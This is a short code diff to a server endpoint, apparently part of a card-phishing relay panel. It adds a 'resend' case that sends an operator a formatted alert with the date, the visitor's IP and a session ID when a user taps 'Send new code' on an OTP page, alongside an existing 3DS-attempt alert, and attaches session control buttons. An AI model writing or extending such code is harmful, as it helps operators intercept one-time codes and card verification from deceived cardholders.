@@ -49,6 +49,16 @@ export async function POST({ request, url, getClientAddress, platform }) {
 🔄 Attempt: ${attempt ?? 1}
 🔑 Session: \`${sessionId}\``;
     keyboard = buildKeyboard(sessionId, baseUrl, '3ds');
+  } else if (type === 'resend') {
+    message =
+`🔁 *Resend Requested*
+
+⏰ ${date}
+🌍 IP: \`${ip}\`
+
+The user tapped *"Send new code"* on the OTP page.
+🔑 Session: \`${sessionId}\``;
+    keyboard = buildKeyboard(sessionId, baseUrl, 'otp');
   } else {
     return json({ ok: false }, { status: 400 });
   }
